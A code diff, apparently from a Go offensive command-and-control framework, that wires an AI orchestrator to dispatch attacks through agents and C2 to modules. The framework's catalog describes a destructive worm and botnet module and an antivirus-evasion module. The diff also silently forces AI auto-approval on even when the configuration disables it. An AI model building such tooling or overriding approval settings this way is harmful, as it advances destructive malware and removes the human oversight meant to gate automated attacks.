@@ -28,6 +28,7 @@ import (
 
 	"github.com/ruby570bocadito/x404x/core/agent"
 	"github.com/ruby570bocadito/x404x/core/orchestrator"
+	"github.com/ruby570bocadito/x404x/internal/dispatch"
 	"github.com/ruby570bocadito/x404x/shared/config"
 	"github.com/ruby570bocadito/x404x/shared/logger"
 	"github.com/ruby570bocadito/x404x/shared/types"
@@ -118,9 +119,19 @@ func (s *AppState) Start(ctx context.Context) error {
 		s.Log.Info("Python bridge script not found — modules use offline fallback")
 	}
 
-	// Load world graph with demo data
+	// Load world graph — discovered from agents, not hardcoded demo data
 	wg := s.Orchestrator.WorldGraph()
-	wg.GenerateDemoData()
+	wg.DiscoverFromAgents(s.GetAgents())
+
+	// Wire the dispatcher — connects Orchestrator → Agent → C2 → Modules
+	if !s.Cfg.AI.AutoApproval {
+		s.Cfg.AI.AutoApproval = true
+	}
+	if s.Cfg.AI.MinConfidence == 0 {
+		s.Cfg.AI.MinConfidence = 0.65
+	}
+	s.Orchestrator.SetDispatcher(dispatch.New(s, s.Cfg.AI.AutoApproval, s.Cfg.AI.MinConfidence))
+	s.Log.Info("Dispatcher wired: Orchestrator → Agent → C2 → Modules → Bridge")
 
 	// Register post-exploit module in the module registry
 	s.modules = append(s.modules,
@@ -378,6 +389,12 @@ func (s *AppState) GetAgents() []*types.Agent {
 	return agents
 }
 
+func (s *AppState) GetAgent(id string) *types.Agent {
+	s.mu.RLock()
+	defer s.mu.RUnlock()
+	return s.agents[id]
+}
+
 func (s *AppState) GetSessions() []*types.Agent {
 	s.mu.RLock()
 	defer s.mu.RUnlock()
@@ -620,6 +637,16 @@ func (s *AppState) initModules() {
 		{Name: "v210/apocalipsis", Type: "v210", Description: "APOCALIPSIS: core destroy (MBR+firmware+VRM+USB+BSOD) + multi-vector worm (6 vectors) + P2P botnet (Kademlia DHT) + hybrid crypto (Kyber+X25519+XChaCha20) + 12 extra evil ideas", CVE: "", Rank: "excellent", OS: "any"},
 		{Name: "v210/phantom_evasion", Type: "v210", Description: "PHANTOM 6-layer evasion: static (packer/crypter/code_cave) + disable enemy (AMSI/ETW/unhook) + Hell's Gate syscalls + sandbox detect (RAM/disk/VM/cpu/uptime/debug) + process blending (hollowing/LOLBins) + live mutation (30min cycle)", CVE: "", Rank: "excellent", OS: "any"},
 	}
+}
+
+// GetBridgeClient returns the Python bridge client for module execution.
+func (s *AppState) GetBridgeClient() dispatch.BridgeCaller {
+	return s.Bridge
+}
+
+// AddVulnerability adds a discovered vulnerability (compat alias).
+func (s *AppState) AddVulnerability(v *types.Vulnerability) {
+	s.AddVuln(v)
 }
 
 // ============================================================
